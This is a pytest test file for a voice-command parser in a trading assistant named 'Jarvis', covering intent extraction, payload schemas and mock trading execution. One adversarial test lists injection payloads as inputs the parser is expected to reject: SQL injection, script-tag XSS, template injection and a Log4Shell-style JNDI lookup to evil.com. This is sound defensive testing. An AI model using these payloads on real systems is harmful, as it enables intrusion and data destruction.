    def test_ticket_extraction_accuracy(self, parser, input_text, expected_ticket):
        extracted = parser.extract_ticket(input_text)
        assert extracted == expected_ticket

    # --- Pip Buffer Extraction ---

    @pytest.mark.parametrize("input_text, expected_buffer", [
        ("with 2 pips buffer", 2.0),
        ("with 2.5 pips buffer", 2.5),
        ("plus 1.5 pips", 1.5),
        ("+ 3 pips", 3.0),
        ("buffer of 0.5 pips", 0.5),
        ("4.0 pips buffer", 4.0),
    ])
    def test_pip_buffer_extraction_accuracy(self, parser, input_text, expected_buffer):
        buffer = parser.extract_buffer_pips(input_text)
        assert abs(buffer - expected_buffer) < 1e-2

    # --- Timeframe Extraction ---

    @pytest.mark.parametrize("input_text, expected_tf", [
        ("Find order blocks on M1", "M1"),
        ("Find order blocks on M5", "M5"),
        ("Find order blocks on M15", "M15"),
        ("Find order blocks on M30", "M30"),
        ("Find order blocks on H1", "H1"),
        ("Find order blocks on H4", "H4"),
        ("Find order blocks on D1", "D1"),
        ("Find order blocks on 15 minute", "M15"),
        ("Find order blocks on hourly", "H1"),
        ("Find order blocks on daily", "D1"),
    ])
    def test_timeframe_extraction_accuracy(self, parser, input_text, expected_tf):
        tf = parser.extract_timeframe(input_text)
        assert tf == expected_tf


# ==============================================================================
# TIER 3: CROSS-FEATURE PAIRWISE COMBINATIONS & STATE VARIATIONS
# ==============================================================================

class TestVoiceNLPPairwiseCombinations:
    """
    Tier 3 tests verifying complex interactions:
      - Ticket precedence over default active symbol
      - Explicit ratio with explicit ticket
      - Breakeven buffer alongside symbol alias
      - Multi-word command variations and natural conversational styling
    """

    def test_scale_out_ticket_precedence_over_symbol(self, parser):
        # When both ticket and symbol are provided, ticket is extracted directly
        res = parser.parse_command("Close 50% on Gold ticket 579421", active_symbol="EURUSD")
        assert res["intent"] == "SCALE_OUT_PARTIAL"
        assert res["entities"]["ticket"] == 579421
        assert res["entities"]["symbol"] == "XAUUSD"
        assert res["entities"]["ratio"] == 0.50

    def test_scale_out_custom_ratio_with_ticket(self, parser):
        res = parser.parse_command("Take 33% off position #991244")
        assert res["intent"] == "SCALE_OUT_PARTIAL"
        assert res["entities"]["ticket"] == 991244
        assert res["entities"]["ratio"] == 0.33

    def test_breakeven_with_fractional_pip_buffer_on_sterling(self, parser):
        res = parser.parse_command("Lock breakeven on sterling with 2.5 pips buffer")
        assert res["intent"] == "LOCK_BREAKEVEN"
        assert res["entities"]["symbol"] == "GBPUSD"
        assert res["entities"]["buffer_pips"] == 2.5

    def test_scan_liquidity_sweeps_with_session_and_tf(self, parser):
        res = parser.parse_command("Scan London session EQH sweeps on Cable M15")
        assert res["intent"] == "SCAN_LIQUIDITY_SWEEPS"
        assert res["entities"]["symbol"] == "GBPUSD"
        assert res["entities"]["timeframe"] == "M15"
        assert res["entities"]["session"] == "London"

    def test_modify_stop_loss_on_ticket(self, parser):
        res = parser.parse_command("Set Stop Loss on ticket 579421 to 2642.80")
        assert res["intent"] == "MODIFY_SL_TP"
        assert res["entities"]["param"] == "SL"
        assert res["entities"]["ticket"] == 579421
        assert res["entities"]["price"] == 2642.80

    def test_active_symbol_fallback_when_symbol_omitted(self, parser):
        res = parser.parse_command("Lock Breakeven", active_symbol="USDJPY")
        assert res["intent"] == "LOCK_BREAKEVEN"
        assert res["entities"]["symbol"] == "USDJPY"

        res2 = parser.parse_command("Show Macro Bias", active_symbol="EURUSD")
        assert res2["intent"] == "SHOW_MACRO_BIAS"
        assert res2["entities"]["symbol"] == "EURUSD"


# ==============================================================================
# TIER 4: REAL-WORLD INSTITUTIONAL TRADING VOICE SCENARIOS
# ==============================================================================

class TestVoiceNLPInstitutionalScenarios:
    """
    Tier 4 tests simulating end-to-end conversational workflows of an institutional
    trader running hands-free execution across a complete trading session.
    """

    def test_full_session_conversational_workflow(self, parser):
        # Step 1: Pre-session market intelligence query
        s1 = parser.parse_command("Show Gold Macro Bias")
        assert s1["success"] is True
        assert s1["intent"] == "SHOW_MACRO_BIAS"
        assert s1["entities"]["symbol"] == "XAUUSD"
        assert s1["chime_event"] == "QUERY_ACK"

        # Step 2: Scan for liquidity setups on M15
        s2 = parser.parse_command("Scan for Liquidity Sweeps on Gold M15")
        assert s2["success"] is True
        assert s2["intent"] == "SCAN_LIQUIDITY_SWEEPS"
        assert s2["entities"]["symbol"] == "XAUUSD"
        assert s2["entities"]["timeframe"] == "M15"

        # Step 3: Trade running into TP1 -> Scale out 50%
        s3 = parser.parse_command("Close 50% on Gold")
        assert s3["success"] is True
        assert s3["intent"] == "SCALE_OUT_PARTIAL"
        assert s3["entities"]["symbol"] == "XAUUSD"
        assert s3["entities"]["ratio"] == 0.50
        assert s3["chime_event"] == "EXECUTION_SUCCESS"

        # Step 4: Lock stop to breakeven with 2 pips buffer
        s4 = parser.parse_command("Lock Breakeven on Gold with 2 pips buffer")
        assert s4["success"] is True
        assert s4["intent"] == "LOCK_BREAKEVEN"
        assert s4["entities"]["symbol"] == "XAUUSD"
        assert s4["entities"]["buffer_pips"] == 2.0
        assert s4["chime_event"] == "EXECUTION_SUCCESS"

        # Step 5: Check Aladdin risk metrics & consistency gauge
        s5 = parser.parse_command("What is my VaR today?")
        assert s5["success"] is True
        assert s5["intent"] == "GET_RISK_METRICS"
        assert s5["entities"]["metric"] == "var"

        # Step 6: Check daily drawdown status
        s6 = parser.parse_command("Check daily drawdown")
        assert s6["success"] is True
        assert s6["intent"] == "GET_RISK_METRICS"
        assert s6["entities"]["metric"] == "drawdown"

        # Step 7: Unexpected flash event -> Trigger Emergency Circuit Breaker
        s7 = parser.parse_command("Emergency kill switch")
        assert s7["success"] is True
        assert s7["intent"] == "EMERGENCY_KILL_SWITCH"
        assert s7["chime_event"] == "KILL_SWITCH_ALARM"
        assert s7["action_payload"]["status"] == "EMERGENCY_LOCKED"


# ==============================================================================
# TIER 5: ADVERSARIAL ROBUSTNESS, NOISE HARDENING & ERROR HANDLING
# ==============================================================================

class TestVoiceNLPAdversarialHardening:
    """
    Tier 5 tests verifying resilience against:
      - Empty / whitespace transcripts
      - Speech recognition noise, pauses, filler words
      - Special characters, non-ASCII input, emojis
      - Injection strings (SQL, script tags)
      - Extremely long transcripts
      - Ambiguous / unsupported voice requests
    """

    def test_empty_and_whitespace_transcripts(self, parser):
        for raw in ["", "   ", "\t\n  ", None]:
            res = parser.parse_command(raw)
            assert res["success"] is False
            assert res["intent"] == "UNKNOWN_FALLBACK"
            assert res["action_taken"] is False
            assert res["chime_event"] == "ERROR_CHIME"

    def test_audio_noise_and_stt_filler_words(self, parser):
        # Audio noise tags like [cough], [inaudible] should not crash parser
        res = parser.parse_command("[cough] Close 50% on Gold [snicker]")
        assert res["success"] is True
        assert res["intent"] == "SCALE_OUT_PARTIAL"
        assert res["entities"]["symbol"] == "XAUUSD"
        assert res["entities"]["ratio"] == 0.50

    def test_emojis_and_unicode_symbols(self, parser):
        res = parser.parse_command("Close 50% on 🥇 Gold 🚀")
        assert res["success"] is True
        assert res["intent"] == "SCALE_OUT_PARTIAL"
        assert res["entities"]["symbol"] == "XAUUSD"

        res2 = parser.parse_command("Lock Breakeven on 💶 EURUSD")
        assert res2["success"] is True
        assert res2["intent"] == "LOCK_BREAKEVEN"
        assert res2["entities"]["symbol"] == "EURUSD"

    def test_unsupported_out_of_domain_requests(self, parser):
        unsupported = [
            "Order me a pepperoni pizza",
            "What is the weather in London today?",
            "Sing a song for me Jarvis",
            "Play Beethoven symphony number 5",
            "Tell me a joke about wall street"
        ]
        for cmd in unsupported:
            res = parser.parse_command(cmd)
            assert res["success"] is False
            assert res["intent"] == "UNKNOWN_FALLBACK"
            assert res["action_taken"] is False
            assert res["chime_event"] == "ERROR_CHIME"

    def test_sql_and_xss_injection_resilience(self, parser):
        injections = [
            "'; DROP TABLE positions; --",
            "<script>alert('pwned')</script>",
            "' OR '1'='1",
            "{{ 7 * 7 }}",
            "${jndi:ldap://evil.com/a}"
        ]
        for injection in injections:
            res = parser.parse_command(injection)
            # Should safely classify as fallback without exception
            assert res["success"] is False
            assert res["intent"] == "UNKNOWN_FALLBACK"
            assert res["action_taken"] is False

    def test_extremely_long_transcript_stress(self, parser):
        # 5,000 repetitions of noise
        long_noise = "noise " * 1000 + "Close 50% on Gold " + "filler " * 1000
        res = parser.parse_command(long_noise)
        assert res["intent"] == "SCALE_OUT_PARTIAL"
        assert res["entities"]["symbol"] == "XAUUSD"

    def test_gibberish_and_punctuation_only(self, parser):
        gibberish = ["!@#$%^&*()", "???....!!!", "asdkjfhqwpeoifjuasdn", "zzzzzzzzzzz"]
        for g in gibberish:
            res = parser.parse_command(g)
            assert res["success"] is False
            assert res["intent"] == "UNKNOWN_FALLBACK"


# ==============================================================================
# JARVIS AI AUDIO CHIME & SPEECH RESPONSE SPECIFICATION TESTS
# ==============================================================================

class TestJarvisSpeechAndChimeTriggers:
    """
    Tests ensuring Jarvis AI speech synthesis responses and audio chime triggers
    conform to institutional operational standards:
      - Clear spoken confirmation containing resolved entities
      - Deterministic audio chime event tags matching cockpit sound bank
    """

    def test_chime_event_taxonomy(self, parser):
        # Scale out -> EXECUTION_SUCCESS
        assert parser.parse_command("Close 50% on Gold")["chime_event"] == "EXECUTION_SUCCESS"
        # Breakeven -> EXECUTION_SUCCESS
        assert parser.parse_command("Lock Breakeven on USDJPY")["chime_event"] == "EXECUTION_SUCCESS"
        # Kill switch -> KILL_SWITCH_ALARM
        assert parser.parse_command("Emergency kill switch")["chime_event"] == "KILL_SWITCH_ALARM"
        # Query -> QUERY_ACK
        assert parser.parse_command("Show Gold Macro Bias")["chime_event"] == "QUERY_ACK"
        assert parser.parse_command("What is my VaR today?")["chime_event"] == "QUERY_ACK"
        assert parser.parse_command("Scan for Liquidity Sweeps")["chime_event"] == "QUERY_ACK"
        # Error -> ERROR_CHIME
        assert parser.parse_command("Order a pizza")["chime_event"] == "ERROR_CHIME"

    def test_speech_synthesis_formatting(self, parser):
        # Speech strings must be non-empty and well-formed sentences
        res = parser.parse_command("Close 50% on USDJPY")
        speech = res["response_speech"]
        assert isinstance(speech, str)
        assert len(speech) > 10
        assert "50%" in speech
        assert "USDJPY" in speech

        res_be = parser.parse_command("Lock Breakeven on Gold with 2 pips buffer")
        assert "breakeven" in res_be["response_speech"].lower()

# ==============================================================================
# ACTION PAYLOAD SCHEMAS & REST/WEBSOCKET CONTRACT TESTS
# ==============================================================================

class TestVoiceNLPActionPayloadSchemas:
    """
    Validates that every intent's generated payload satisfies the exact REST/WebSocket
    execution contracts defined in PROJECT.md § Interface Contracts.
    """

    def test_scale_out_payload_schema(self, parser):
        res = parser.parse_command("Close 50% on USDJPY")
        payload = res["action_payload"]
        assert payload["action"] == "scale_out"
        assert payload["symbol"] == "USDJPY"
        assert payload["ratio"] == 0.50
        assert "ticket" in payload

    def test_breakeven_payload_schema(self, parser):
        res = parser.parse_command("Lock Breakeven on Gold with 2 pips buffer")
        payload = res["action_payload"]
        assert payload["action"] == "breakeven"
        assert payload["symbol"] == "XAUUSD"
        assert payload["buffer_pips"] == 2.0
        assert "ticket" in payload

    def test_modify_sltp_payload_schema(self, parser):
        res = parser.parse_command("Set Stop Loss on Gold to 2645.50")
        payload = res["action_payload"]
        assert payload["action"] == "modify_sltp"
        assert payload["param"] == "SL"
        assert payload["price"] == 2645.50
        assert payload["symbol"] == "XAUUSD"

    def test_kill_switch_payload_schema(self, parser):
        res = parser.parse_command("Emergency kill switch")
        payload = res["action_payload"]
        assert payload["action"] == "kill_switch"
        assert payload["cancel_pending"] is True
        assert payload["status"] == "EMERGENCY_LOCKED"
        assert "reason" in payload

    def test_scan_liquidity_payload_schema(self, parser):
        res = parser.parse_command("Scan for Liquidity Sweeps on Gold M15")
        payload = res["action_payload"]
        assert payload["action"] == "scan_liquidity"
        assert payload["symbol"] == "XAUUSD"
        assert payload["concept"] == "sweeps"
        assert payload["timeframe"] == "M15"

    def test_risk_metrics_payload_schema(self, parser):
        res = parser.parse_command("What is my VaR today?")
        payload = res["action_payload"]
        assert payload["action"] == "query_risk_metrics"
        assert payload["metric"] == "var"

    def test_system_status_payload_schema(self, parser):
        res = parser.parse_command("Jarvis system status")
        payload = res["action_payload"]
        assert payload["action"] == "query_system_status"


# ==============================================================================
# MOCK EXECUTION & BOT INTEGRATION TESTS
# ==============================================================================

class MockMT5Connector:
    """Mock MT5 connector for testing voice dispatch execution pipeline."""
    def __init__(self):
        self.closed_partial_calls = []
        self.modify_position_calls = []
        self.emergency_closed = False
        self.mock_positions = [
            {"ticket": 579421, "symbol": "XAUUSD", "volume": 1.0, "price_open": 2645.0, "sl": 2635.0, "tp": 2665.0, "profit": 350.0},
            {"ticket": 100201, "symbol": "EURUSD", "volume": 0.5, "price_open": 1.0820, "sl": 1.0780, "tp": 1.0900, "profit": 80.0},
            {"ticket": 300401, "symbol": "USDJPY", "volume": 0.8, "price_open": 153.20, "sl": 152.50, "tp": 154.50, "profit": 120.0},
        ]

    def close_partial_position(self, ticket: int, volume: float):
        self.closed_partial_calls.append({"ticket": ticket, "volume": volume})
        return {"success": True, "ticket": ticket, "closed_volume": volume, "remaining_volume": 0.5}

    def modify_position(self, ticket: int, sl: float, tp: float):
        self.modify_position_calls.append({"ticket": ticket, "sl": sl, "tp": tp})
        return {"success": True, "ticket": ticket, "sl": sl, "tp": tp}

    def emergency_close_all(self):
        self.emergency_closed = True
        return {"success": True, "closed_positions": 3, "cancelled_orders": 0}


class MockBotEngine:
    """Mock Bot Engine for testing voice execution state toggles."""
    def __init__(self):
        self.paused = False
        self.emergency_locked = False

    def pause(self):
        self.paused = True

    def resume(self):
        self.paused = False


class TestVoiceNLPMockExecutionIntegration:
    """
    Tests integrating the voice parser with mock MT5 connector and bot engine.
    """

    def test_parser_instantiation_with_mocks(self):
        mock_mt5 = MockMT5Connector()
        mock_bot = MockBotEngine()
        p = ReferenceVoiceNLPParser(mt5_connector=mock_mt5, bot_engine=mock_bot)
        assert p.mt5 is mock_mt5
        assert p.bot_engine is mock_bot

    def test_parser_kill_switch_with_mock_bot(self):
        mock_mt5 = MockMT5Connector()
        mock_bot = MockBotEngine()
        p = ReferenceVoiceNLPParser(mt5_connector=mock_mt5, bot_engine=mock_bot)
        res = p.parse_command("Emergency kill switch")
        assert res["success"] is True
        assert res["intent"] == "EMERGENCY_KILL_SWITCH"


if __name__ == "__main__":
    pytest.main(["-v", __file__])
